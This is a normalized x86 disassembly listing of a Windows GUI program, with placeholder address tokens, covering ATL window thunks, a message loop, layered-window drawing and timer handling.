mov [ esp + 0x48 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_416ac0
jmp r-xdata
lea ecx [ esi + 0x2c ]
push ecx
mov ecx [ esi + 0x64 ]
call sub_408ca0
mov ebp [ time@IAT ]
push edi
call ebp
mov ecx [ rw-data ]
xor edx edx
mov dl [ rw-data ]
mov [ esp + 0x54 ] eax
mov eax [ rw-data ]
push edx
mov edx [ esi + 0x24 ]
push eax
push ecx
push edx
push edi
push 0xc
call sub_414860
mov eax [ esi + 0x28 ]
add esp 0x1c
cmp eax edi
jbe r-xdata
mov ecx [ esi + 0x64 ]
cmp ecx edi
je r-xdata
mov [ esp + 0x48 ] 0xffffffff
mov esi [ esp + 0x50 ]
lea ecx [ esi + 0x48 ]
push ecx
lea ecx [ eax + 0xf4 ]
mov [ esi + 0x64 ] eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
push edi
push ecx
mov eax esp
mov [ esp + 0x58 ] esp
mov [ eax ] edi
mov ecx [ esi + 0x18 ]
mov eax [ esi + 0x14 ]
push 0x88
push 0x94000000
push edi
push ecx
mov [ esp + 0x38 ] eax
mov [ esp + 0x34 ] ecx
mov eax esp
lea edx [ esp + 0x2c ]
mov [ esp + 0x2c ] edi
mov [ esp + 0x30 ] edi
mov [ eax ] edx
mov ecx [ esi + 0x64 ]
mov [ esp + 0x68 ] esp
call sub_409d00
cmp eax edi
jne r-xdata
mov ecx esi
call sub_418320
mov ebx [ GetMessageW@IAT ]
push edi
push edi
push edi
lea eax [ esp + 0x30 ]
push eax
call ebx
test eax eax
je r-xdata
imul eax eax 0x3e8
push edi
push eax
push eax
lea ecx [ esi + 0x6c ]
call sub_412860
mov ecx [ esp + 0x40 ]
pop edi
pop esi
pop ebp
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x3c
retn 0x4
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x64 ]
mov eax [ eax + 0x110 ]
cmp eax edi
jne r-xdata
mov ebp [ TranslateAcceleratorW@IAT ]
lea ebx [ ebx ]
cmp eax 0x1
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
xor ecx ecx
mov cl [ rw-data ]
push ecx
mov ecx [ esi + 0x24 ]
push edx
push eax
push ecx
push edi
call ebp
mov ebx [ esp + 0x64 ]
add esp 0x4
sub eax ebx
push eax
push 0x2
jmp r-xdata
push edi
push edi
push edi
lea edx [ esp + 0x30 ]
push edx
call ebx
test eax eax
jne r-xdata
lea eax [ esp + 0x24 ]
push eax
call [ TranslateMessage@IAT ]
lea ecx [ esp + 0x24 ]
push ecx
call [ DispatchMessageW@IAT ]
mov ecx [ esi + 0x64 ]
cmp ecx edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
xor edx edx
mov dl [ rw-data ]
push edx
mov edx [ esi + 0x24 ]
push eax
push ecx
push edx
push edi
call ebp
mov ebx [ esp + 0x64 ]
add esp 0x4
sub eax ebx
push eax
push 0x1
call sub_414860
add esp 0x18
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x24 ]
push ecx
push edi
push edx
call ebp
test eax eax
jne r-xdata
mov ebp [ time@IAT ]
mov [ esi + 0x64 ] edi
call [ OleUninitialize@IAT ]
mov ecx esi
call sub_418350
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_408a90
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
sub edx ecx
push 0xd
sub edx 0xd
push ecx
mov [ ecx ] 0x42444c7
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] 0xe9
mov [ ecx + 0x9 ] edx
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
retn 0x8
sub_408b00
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
sub edx eax
push 0xd
sub edx 0xd
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] edx
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
pop esi
retn 0x8
push 0xd
push 0x4
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
sub_408bc0
push 0xffffffff
push sub_42fcd8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
mov [ esp ] eax
mov [ eax ] r--data
mov [ esp + 0xc ] 0x0
mov ecx [ esp + 0x14 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_408c60
push 0xffffffff
push sub_42fcf8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
mov [ ecx ] r--data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_408cb0
sub esp 0x44
mov eax [ rw-data ]
push esi
mov [ esp + 0x44 ] eax
push edi
mov esi ecx
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push ecx
call [ BeginPaint@IAT ]
mov edi eax
call [ GetLastError@IAT ]
mov eax [ esp + 0xc ]
mov edx [ esi ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
push edi
mov ecx esi
call [ edx + 0x14 ]
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x8 ]
push edx
push eax
call [ EndPaint@IAT ]
mov ecx [ esp + 0x48 ]
pop edi
xor eax eax
pop esi
call sub_42e72f
add esp 0x44
retn 0x10
sub_408d70
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov eax esi
pop esi
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
sub_408ef0
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
sub edx eax
push 0xd
sub edx 0xd
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] edx
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
pop esi
retn 0x8
push 0xd
push 0x4
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ esi + 0xc ] eax
sub_408f90
push 0xffffffff
push sub_42fd1b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_408fe0
push 0xffffffff
push sub_42fd46
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
or edx 0xffffffff
mov [ esp + 0xc ] edx
lea eax [ ecx + 0x8 ]
mov [ esp ] eax
mov [ esp + 0xc ] edx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_409060
push 0xffffffff
push sub_42fd5b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
mov [ esp ] eax
mov [ eax + 0xc ] 0x0
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4090a0
push 0xffffffff
push sub_42fd86
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax ecx
xor edx edx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov [ esp ] eax
mov [ esp + 0x4 ] ecx
mov [ ecx + 0xc ] edx
mov [ esp + 0x10 ] 0x1
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] edx
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_409120
push esi
push edi
push rw-data
call [ Ordinal_ATL71_44@IAT ]
mov edi [ esp + 0xc ]
mov esi eax
mov eax [ esi ]
push esi
mov ecx esi
mov [ esi + 0x4 ] edi
call [ eax + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_408ef0
mov esi [ esi + 0x14 ]
push esi
push 0xfffffffc
push edi
call [ SetWindowLongW@IAT ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push ecx
push edx
push eax
push edi
call esi
pop edi
pop esi
retn 0x10
sub_409170
push ebp
mov bp [ esp + 0x20 ]
test bp bp
push esi
mov esi ecx
jne r-xdata
push ebx
push edi
push esi
lea eax [ esi + 0x8 ]
push eax
push rw-data
call [ Ordinal_ATL71_43@IAT ]
mov edi [ esp + 0x28 ]
test edi edi
mov ebx [ esp + 0x20 ]
jne r-xdata
pop esi
xor eax eax
pop ebp
retn 0x20
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
test ebx 0x40000000
je r-xdata
mov esi [ esp + 0x30 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push esi
mov esi [ rw-data ]
push esi
mov esi [ esp + 0x1c ]
push edi
push esi
mov esi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub esi ecx
push esi
sub eax edx
push eax
mov eax [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x38 ]
push edx
push ebx
movzx edx bp
push ecx
push edx
push eax
call [ CreateWindowExW@IAT ]
pop edi
pop ebx
pop esi
pop ebp
retn 0x20
mov eax rw-data
mov edi esi
sub_409210
sub esp 0x74
push ebx
push ebp
push esi
push edi
mov esi ecx
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x2c ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov edi [ esp + 0x8c ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x38 ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov edx [ esp + 0x2c ]
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x34 ]
mov [ esp + 0x3c ] edx
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] ecx
mov ebp [ edi ]
mov edx [ edi + 0x8 ]
sub edx ebp
mov ebp [ esp + 0x34 ]
sub ebp [ esp + 0x2c ]
cmp edx ebp
jge r-xdata
cmp [ esi + 0xd8 ] ebx
je r-xdata
push edi
call [ CreateCompatibleDC@IAT ]
mov [ esi + 0xdc ] eax
mov ebp [ edi + 0x4 ]
mov edx [ edi + 0xc ]
sub edx ebp
mov ebp ecx
sub ebp eax
cmp edx ebp
jge r-xdata
mov eax [ esi + 0xd8 ]
cmp eax ebx
je r-xdata
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esi + 0xe0 ]
push edx
call [ EqualRect@IAT ]
test eax eax
jne r-xdata
push edi
call [ IsRectEmpty@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
xor eax eax
mov [ esp + 0x60 ] eax
mov ecx [ esp + 0x38 ]
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] eax
mov [ esp + 0x7c ] eax
mov [ esp + 0x80 ] eax
mov eax [ esp + 0x34 ]
sub eax edx
mov [ esp + 0x60 ] eax
mov eax [ esp + 0x30 ]
push ebx
sub eax ecx
push ebx
lea ecx [ esi + 0xf0 ]
push ecx
push ebx
lea edx [ esp + 0x6c ]
mov [ esp + 0x74 ] eax
mov eax [ esi + 0xdc ]
push edx
push eax
mov [ esp + 0x74 ] 0x28
mov [ esp + 0x82 ] 0x20
mov [ esp + 0x84 ] ebx
mov [ esp + 0x80 ] 0x1
call [ CreateDIBSection@IAT ]
mov ecx [ esi + 0xdc ]
push eax
push ecx
mov [ esi + 0xd8 ] eax
call [ SelectObject@IAT ]
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
lea edx [ esi + 0xe0 ]
mov [ edx ] eax
mov eax [ esp + 0x34 ]
mov [ edx + 0x4 ] ecx
mov ecx [ esp + 0x38 ]
mov [ edx + 0x8 ] eax
mov [ edx + 0xc ] ecx
push eax
call [ DeleteObject@IAT ]
mov [ esi + 0xd8 ] ebx
mov eax [ esi + 0xdc ]
lea edx [ esp + 0x3c ]
push edx
push eax
lea ecx [ esi + 0x24 ]
call sub_404b70
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x8 ]
mov [ esp + 0x3c ] eax
mov eax [ edi + 0xc ]
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] edx
mov [ esp + 0x48 ] eax
jmp r-xdata
lea eax [ esi + 0x80 ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x3c ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x40 ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] edx
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x74
retn 0xc
cmp [ esi + 0xd4 ] ebx
je r-xdata
cmp [ esi + 0xdc ] ebx
mov edi [ esp + 0x88 ]
jne r-xdata
mov ecx [ esi + 0xdc ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x34 ]
mov ebp [ esp + 0x2c ]
push 0xcc0020
push ebx
push ebx
push ecx
sub edx [ esp + 0x40 ]
push edx
sub eax ebp
push eax
push ebx
push ebx
push edi
call [ BitBlt@IAT ]
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x4c ]
push ecx
push edx
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x4c ]
mov edx [ esp + 0x54 ]
mov ecx [ esp + 0x50 ]
sub edx eax
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x58 ]
push 0x2
sub eax ecx
mov [ esp + 0x2c ] ecx
lea ecx [ esp + 0x14 ]
push ecx
push ebx
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] eax
mov eax [ esi + 0xdc ]
lea edx [ esp + 0x20 ]
push edx
push eax
mov eax [ esi + 0x4 ]
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x3c ]
push edx
push ebx
push eax
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x37 ] 0x1
mov [ esp + 0x35 ] bl
mov [ esp + 0x36 ] 0xff
call [ UpdateLayeredWindow@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x74
retn 0xc
sub_4094b0
mov eax [ esp + 0x10 ]
push esi
mov esi ecx
lea ecx [ esi + 0x24 ]
mov [ eax ] 0x0
call sub_405f40
mov ecx [ esi + 0x4 ]
push 0x430
push ecx
call [ KillTimer@IAT ]
mov eax [ esi + 0xd8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xdc ]
test eax eax
je r-xdata
push eax
call [ DeleteObject@IAT ]
mov [ esi + 0xd8 ] 0x0
push 0x0
call [ PostQuitMessage@IAT ]
xor eax eax
pop esi
retn 0x10
push eax
call [ DeleteDC@IAT ]
mov [ esi + 0xdc ] 0x0
sub_409520
cmp [ esp + 0x8 ] 0x430
push ebp
mov ebp ecx
jne r-xdata
xor eax eax
pop ebp
retn 0x10
push ebx
push esi
push edi
mov edi [ FindWindowW@IAT ]
push r--data
push 0x0
call edi
push r--data
push 0x0
mov esi eax
call edi
test esi esi
mov ebx [ IsWindowVisible@IAT ]
mov edi eax
je r-xdata
test edi edi
je r-xdata
push esi
call ebx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
retn 0x10
push edi
call ebx
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
push 0x430
push eax
call [ KillTimer@IAT ]
mov ecx [ ebp + 0x4 ]
push 0x0
push 0x0
push 0x10
push ecx
call [ SendMessageW@IAT ]
sub_4095a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42fd9b
push eax
mov eax [ esp + 0x10 ]
test eax eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov [ esi ] eax
je r-xdata
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
sub_409630
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42fdbb
push eax
mov eax [ esp + 0x10 ]
test eax eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov [ esi ] eax
je r-xdata
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
sub_409700
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
cmp [ esi ] 0x0
je r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
call sub_404910
push eax
call [ InterlockedIncrement@IAT ]
sub_409740
mov eax [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
retn
push ebp
mov ebp [ InterlockedDecrement@IAT ]
push esi
mov esi [ esp + 0x18 ]
lea esp [ esp ]
cmp edi [ esp + 0x10 ]
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
sub edi 0x8
sub esi 0x8
cmp esi edi
je r-xdata
mov eax esi
pop esi
pop ebp
pop edi
retn
mov ecx [ edi ]
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ InterlockedIncrement@IAT ]
push eax
call ebp
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_4097d0
push 0xffffffff
push sub_42fde1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx [ esp + 0x14 ]
mov [ esp ] ecx
mov [ esp + 0xc ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esp + 0x18 ]
mov edx [ eax ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
test eax eax
mov [ ecx + 0x4 ] eax
je r-xdata
push eax
call [ InterlockedIncrement@IAT ]
sub_409830
push 0xffffffff
push sub_42fdf8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call sub_408fe0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_409870
push 0xffffffff
push sub_42fe2e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax ecx
xor edx edx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov [ esp ] eax
mov [ esp + 0x4 ] ecx
mov [ ecx + 0xc ] edx
mov [ esp + 0x10 ] 0x1
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] edx
mov [ esp + 0x10 ] 0x2
mov ecx [ DefWindowProcW@IAT ]
mov [ eax + 0x20 ] ecx
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_4098e0
push 0xffffffff
push sub_42fe48
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_409870
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_409920
push 0xffffffff
push sub_42fe70
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call sub_408fe0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_409960
push 0xffffffff
push sub_42feb2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x1
lea ecx [ esi + 0xf4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x24 ]
call sub_408100
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_408fe0
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_409a10
sub esp 0x24
push ebx
mov ebx [ esp + 0x30 ]
push ebp
mov ebp [ esp + 0x3c ]
push esi
mov esi [ esp + 0x34 ]
mov edx [ esi + 0x18 ]
mov eax [ esi + 0x4 ]
push edi
mov edi [ esp + 0x40 ]
xor ecx ecx
push ecx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x28 ] ecx
lea ecx [ esp + 0x3c ]
push ecx
push ebp
mov [ esp + 0x48 ] edx
push edi
lea edx [ esp + 0x20 ]
push ebx
mov [ esi + 0x18 ] edx
mov edx [ esi ]
push eax
mov ecx esi
mov [ esp + 0x44 ] 0x24
mov [ esp + 0x48 ] 0x1
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] ebp
call [ edx ]
test eax eax
mov edx [ esp + 0x3c ]
mov [ esi + 0x18 ] edx
jne r-xdata
mov eax [ esi + 0x1c ]
test al 0x1
je r-xdata
cmp ebx 0x82
mov eax [ esi + 0x4 ]
je r-xdata
mov eax [ esp + 0x38 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn 0x10
mov ecx [ esi + 0x18 ]
test ecx ecx
jne r-xdata
mov ebx [ GetWindowLongW@IAT ]
push 0xfffffffc
push eax
call ebx
mov edx [ esi + 0x4 ]
push ebp
push edi
push 0x82
mov [ esp + 0x48 ] eax
mov eax [ esi + 0x20 ]
push edx
push eax
call [ CallWindowProcW@IAT ]
mov ecx [ esi + 0x20 ]
mov [ esp + 0x38 ] eax
cmp ecx [ DefWindowProcW@IAT ]
je r-xdata
mov ecx [ esi + 0x20 ]
push ebp
push edi
push ebx
push eax
push ecx
call [ CallWindowProcW@IAT ]
mov [ esp + 0x38 ] eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
and eax 0xfffffffe
push ecx
mov ecx esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x1c ] eax
call [ edx + 0xc ]
or [ esi + 0x1c ] 0x1
mov eax [ esi + 0x4 ]
push 0xfffffffc
push eax
call ebx
cmp eax [ esp + 0x3c ]
jne r-xdata
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x4 ]
push edx
push 0xfffffffc
push eax
call [ SetWindowLongW@IAT ]
sub_409b30
mov eax [ rw-data ]
test eax eax
push esi
push edi
mov esi ecx
jne r-xdata
lea eax [ esi + 0x20 ]
push eax
push rw-data
push rw-data
push rw-data
call [ Ordinal_ATL71_45@IAT ]
mov edx [ esp + 0x18 ]
test edx edx
jne r-xdata
mov [ rw-data ] 0x0
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
mov edx 0x56000000
mov edi [ esp + 0x24 ]
push edi
push eax
mov eax [ esp + 0x28 ]
push eax
mov eax [ esp + 0x28 ]
push eax
push edx
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x28 ]
push ecx
push edx
mov ecx esi
call sub_409170
pop edi
pop esi
retn 0x1c
sub_409ba0
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebp
je r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ esp + 0x18 ]
add esi 0x8
cmp esi ebp
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp esi edi
je r-xdata
pop edi
mov ecx [ edi ]
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ InterlockedIncrement@IAT ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_409c60
push 0xffffffff
push sub_42feea
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_409870
mov [ esp + 0x10 ] 0x1
push 0x1
lea ecx [ esi + 0x24 ]
mov [ esi ] r--data
call sub_408040
mov [ esp + 0x10 ] 0x2
lea ecx [ esi + 0xf4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0x3
xor eax eax
mov [ esi + 0xd4 ] eax
mov [ esi + 0xd8 ] eax
mov [ esi + 0xdc ] eax
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_409d00
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
or eax 0x80000
push eax
mov eax [ esp + 0x14 ]
and edx 0x3fffffff
or edx 0x80000000
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x0
mov [ ecx + 0xd4 ] 0x1
call sub_409b30
neg eax
sbb eax eax
neg eax
retn 0x18
sub_409d50
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push edx
push eax
mov [ ecx + 0xd4 ] 0x0
call sub_409b30
neg eax
sbb eax eax
neg eax
retn 0x1c
sub_409d90
push ebp
mov ebp esp
push 0xffffffff
push sub_42ff00
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
mov ecx ebx
call sub_409c40
add edi 0x8
mov [ ebp + 0x10 ] edi
add esi 0x8
mov [ ebp + 0x8 ] esi
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_409dfa
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call _CxxThrowException
mov ebx [ ebp + 0x14 ]
push esi
